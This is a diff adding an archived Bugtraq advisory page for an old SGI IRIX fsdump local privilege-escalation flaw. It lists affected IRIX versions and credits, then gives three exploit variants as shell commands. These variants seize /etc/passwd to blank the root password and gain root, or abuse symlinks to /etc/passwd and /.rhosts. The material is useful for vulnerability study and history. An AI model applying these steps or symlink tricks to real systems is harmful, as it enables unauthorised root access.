@@ -1,0 +1,116 @@
+#bid355<p><b><span style="font-size: 18pt;">IRIX fsdump Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/355/info">info</a><br><a href="http://www.securityfocus.com/bid/355/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/355/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/355/solution">solution</a><br><a href="http://www.securityfocus.com/bid/355/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				355
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Access Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Dec 03 1996 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Dec 03 1996 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				The first variant of this bug was reported to the Bugtraq mailing list by Jaechul Choe &lt;poison@cosmos.kaist.ac.kr&gt; on December 3, 1996. Subsequent variants were reported by Yuri Volobuev &lt;volobuev@t1.chem.umn.edu&gt; and Chris Sheldon &lt;csh@VIEWGRAPHICS.COM&gt; o
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					SGI IRIX 6.2 <br/>
+					
+				
+					SGI IRIX 6.1 <br/>
+					
+				
+					SGI IRIX 6.0.1 <br/>
+					
+				
+					SGI IRIX 6.0 <br/>
+					
+				
+					SGI IRIX 5.3 <br/>
+					
+				
+					SGI IRIX 5.2 <br/>
+					
+				
+					SGI IRIX 5.1.1 <br/>
+					
+				
+					SGI IRIX 5.1 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	Variant 1:<br/>irix% /var/rfindd/fsdump -L/etc/passwd -F/tmp/dump /<br/>(count to three, and hit ctrl-c)<br/>irix% ls -la /etc/passwd<br/>-rw-r--r--    1 csh      users        956 Feb 25 06:23 /etc/passwd<br/>irix% tail -8 /etc/passwd<br/>nobody:*:60001:60001:SVR4 nobody uid:/dev/null:/dev/null<br/>noaccess:*:60002:60002:uid no access:/dev/null:/dev/null<br/>nobody:*:-2:-2:original nobody uid:/dev/null:/dev/null<br/><br/>Tue Feb 25 06:23:48 PST 1997<br/>Number of inodes total 208740; allocated 31259<br/>Collecting garbage.<br/>interrupted<br/>irix% vi /etc/passwd            # remove the encrypted root password<br/>irix% chgrp sys /etc/passwd<br/>irix% chown root /etc/passwd<br/>irix% su -<br/>irix#<br/><br/>Variant 2:<br/><br/>cp /etc/passwd /tmp/passwd<br/>ln -s /etc/passwd rfd.lock<br/>/var/rfindd/fsdump -F/tmp/rfd /<br/>/var/rfindd/fsdump -L/etc/passwd -F/tmp/rfd /<br/><br/>Variant 3:<br/>cd /tmp<br/>ln -s /.rhosts fsdump.dir<br/>/var/rfindd/fsdump -Fgimme /<br/>ls -al /.rhosts<br/>rm -f fsdump.dir fsdump.pag gimme
+	
+		<ul>
+</ul>
+</div>
